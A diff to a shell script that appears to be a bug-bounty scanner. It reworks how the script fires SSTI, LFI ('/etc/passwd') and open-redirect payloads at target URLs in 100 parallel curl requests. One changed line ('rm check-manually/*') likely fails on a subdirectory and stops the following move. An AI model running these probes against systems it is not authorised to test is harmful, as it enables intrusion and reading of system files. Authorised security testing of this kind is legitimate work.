@@ -221,57 +221,54 @@ do
 
         echo "[*] GETTING INTERESTING PARAMETERS WITH GF..."
         mkdir "check-manually"
-        gf ssrf < "paths-$DOMAIN.txt" | httpx -silent -no-color -threads 50 -mc 200 -o "check-manually/server-side-request-forgery.txt"
-        gf xss < "paths-$DOMAIN.txt" | httpx -silent -no-color -threads 50 -mc 200 -o "check-manually/cross-site-scripting.txt"
-        gf redirect < "paths-$DOMAIN.txt" | httpx -silent -no-color -threads 50 -mc 200 -o "check-manually/open-redirect.txt"
-        gf rce < "paths-$DOMAIN.txt" | httpx -silent -no-color -threads 50 -mc 200 -o "check-manually/rce.txt"
-        gf idor < "paths-$DOMAIN.txt" | httpx -silent -no-color -threads 50 -mc 200 -o "check-manually/insecure-direct-object-reference.txt"
-        gf sqli < "paths-$DOMAIN.txt" | httpx -silent -no-color -threads 50 -mc 200 -o "check-manually/sql-injection.txt"
-        gf lfi < "paths-$DOMAIN.txt" | httpx -silent -no-color -threads 50 -mc 200 -o "check-manually/local-file-inclusion.txt"
-        gf ssti < "paths-$DOMAIN.txt" | httpx -silent -no-color -threads 50 -mc 200 -o "check-manually/server-side-template-injection.txt"
-        notify "GF done! Identified *$(cat check-manually/* | wc -l)* interesting and live parameter endpoints to check. Testing for Server-Side Template Injection..."
+        gf ssrf < "paths-$DOMAIN.txt" > "check-manually/server-side-request-forgery.txt"
+        gf xss < "paths-$DOMAIN.txt" > "check-manually/cross-site-scripting.txt"
+        gf redirect < "paths-$DOMAIN.txt" > "check-manually/open-redirect.txt"
+        gf rce < "paths-$DOMAIN.txt" > "check-manually/rce.txt"
+        gf idor < "paths-$DOMAIN.txt" > "check-manually/insecure-direct-object-reference.txt"
+        gf sqli < "paths-$DOMAIN.txt" > "check-manually/sql-injection.txt"
+        gf lfi < "paths-$DOMAIN.txt" > "check-manually/local-file-inclusion.txt"
+        gf ssti < "paths-$DOMAIN.txt" > "check-manually/server-side-template-injection.txt"
+        notify "GF done! Identified *$(cat check-manually/* | wc -l)* interesting parameter endpoints to check. Checking liveness..."
+
+        echo "[*] CHECKING LIVENESS OF GF-IDENTIFIED ENDPOINTS (TO CHECK MANUALLY)..."
+        httpx -silent -no-color -l "check-manually/server-side-request-forgery.txt" -threads 25 -o "check-manually/live/server-side-request-forgery.txt"
+        httpx -silent -no-color -l "check-manually/cross-site-scripting.txt" -threads 25 -o "check-manually/live/cross-site-scripting.txt"
+        httpx -silent -no-color -l "check-manually/open-redirect.txt" -threads 25 -o "check-manually/live/open-redirect.txt"
+        httpx -silent -no-color -l "check-manually/rce.txt" -threads 25 -o "check-manually/live/rce.txt"
+        httpx -silent -no-color -l "check-manually/insecure-direct-object-reference.txt" -threads 25 -o "check-manually/live/insecure-direct-object-reference.txt"
+        httpx -silent -no-color -l "check-manually/sql-injection.txt" -threads 25 -o "check-manually/live/sql-injection.txt"
+        httpx -silent -no-color -l "check-manually/local-file-inclusion.txt" -threads 25 -o "check-manually/live/local-file-inclusion.txt"
+        httpx -silent -no-color -l "check-manually/server-side-template-injection.txt" -threads 25 -o "check-manually/live/server-side-template-injection.txt"
+        rm check-manually/* && mv check-manually/live/* check-manually/ && rm -rf check-manually/live/
+        notify "Done! Identified *$(cat check-manually/* | wc -l)* live endpoints to check. Testing for Server-Side Template Injection..."
 
         echo "[*] Testing for SSTI..."
-        qsreplace "BugBountyScanner{{9*9}}" < "check-manually/server-side-template-injection.txt" | httpx -silent -threads 25 -sr -srd ssti-vulnerable
-        grep -r -L -Z "BugBountyScanner81" ssti-vulnerable | xargs --null rm
-        if [ "$(find ssti-vulnerable/* -maxdepth 0 | wc -l)" -eq "0" ]; then
-            notify "No possible SSTI found. Testing for LFI..."
+        qsreplace "BugBountyScanner{{9*9}}" < "check-manually/server-side-template-injection.txt" | \
+        xargs -I % -P 100 sh -c 'curl -s "%" 2>&1 | grep -q "BugBountyScanner81" && echo "[+] Found endpoint likely to be vulnerable to SSTI: %" && echo "%" >> potential-ssti.txt'
+        if [ -f "potential-ssti.txt" ]; then
+            notify "Identified *$(wc -l < potential-ssti.txt)* endpoints potentially vulnerable to SSTI! Testing for Local File Inclusion..."
         else
-            notify "Identified *$(find ssti-vulnerable/* -maxdepth 0 | wc -l)* endpoints potentially vulnerable to SSTI! Testing for Local File Inclusion..."
-            for file in ssti-vulnerable/*; do
-                printf "\n\n########## %s ##########\n\n" "$file" >> potential-ssti.txt
-                cat "$file" >> potential-ssti.txt
-            done
+            notify "No possible SSTI found. Testing for Local File Inclusion..."
         fi
-        rm -rf ssti-vulnerable
 
         echo "[*] Testing for (*nix) LFI..."
-        qsreplace "/etc/passwd" < "check-manually/local-file-inclusion.txt" | httpx -silent -threads 25 -sr -srd lfi-vulnerable
-        grep -r -L -Z "root:x:" lfi-vulnerable | xargs --null rm
-        if [ "$(find lfi-vulnerable/* -maxdepth 0 | wc -l)" -eq "0" ]; then
-            notify "No possible LFI found. Testing for Open Redirections..."
+        qsreplace "/etc/passwd" < "check-manually/local-file-inclusion.txt" | \
+        xargs -I % -P 100 sh -c 'curl -s "%" 2>&1 | grep -q "root:x:" && echo "[+] Found endpoint likely to be vulnerable to LFI: %" && echo "%" >> potential-lfi.txt'
+        if [ -f "potential-lfi.txt" ]; then
+            notify "Identified *$(wc -l < potential-lfi.txt)* endpoints potentially vulnerable to LFI! Testing for Open Redirections..."
         else
-            notify "Identified *$(find lfi-vulnerable/* -maxdepth 0 | wc -l)* endpoints potentially vulnerable to LFI! Testing for Open Redirections..."
-            for file in lfi-vulnerable/*; do
-                printf "\n\n########## %s ##########\n\n" "$file" >> potential-lfi.txt
-                cat "$file" >> potential-lfi.txt
-            done
+            notify "No possible LFI found. Testing for Open Redirections..."
         fi
-        rm -rf lfi-vulnerable
 
         echo "[*] Testing for Open Redirects..."
-        qsreplace "https://www.testing123.com" < "check-manually/open-redirect.txt" | httpx -silent -threads 25 -sr -srd or-vulnerable
-        grep -r -L -Z "Location: https://www.testing123.com" or-vulnerable | xargs --null rm
-        if [ "$(find or-vulnerable/* -maxdepth 0 | wc -l)" -eq "0" ]; then
-            notify "No possible OR found. Resolving hosts..."
+        qsreplace "https://www.testing123.com" < "check-manually/open-redirect.txt" | \
+        xargs -I % -P 100 sh -c 'curl -s "%" 2>&1 | grep -q "Location: https://www.testing123.com" && echo "[+] Found endpoint likely to be vulnerable to OR: %" && echo "%" >> potential-or.txt'
+        if [ -f "potential-or.txt" ]; then
+            notify "Identified *$(wc -l < potential-or.txt)* endpoints potentially vulnerable to OR! Resolving IP Addresses..."
         else
-            notify "Identified *$(find or-vulnerable/* -maxdepth 0 | wc -l)* endpoints potentially vulnerable to OR! Resolving hosts..."
-            for file in or-vulnerable/*; do
-                printf "\n\n########## %s ##########\n\n" "$file" >> potential-or.txt
-                cat "$file" >> potential-or.txt
-            done
+            notify "No possible OR found. Resolving IP Addresses..."
         fi
-        rm -rf or-vulnerable
 
         echo "[*] Resolving IP addresses from hosts..."
         while read -r hostname; do
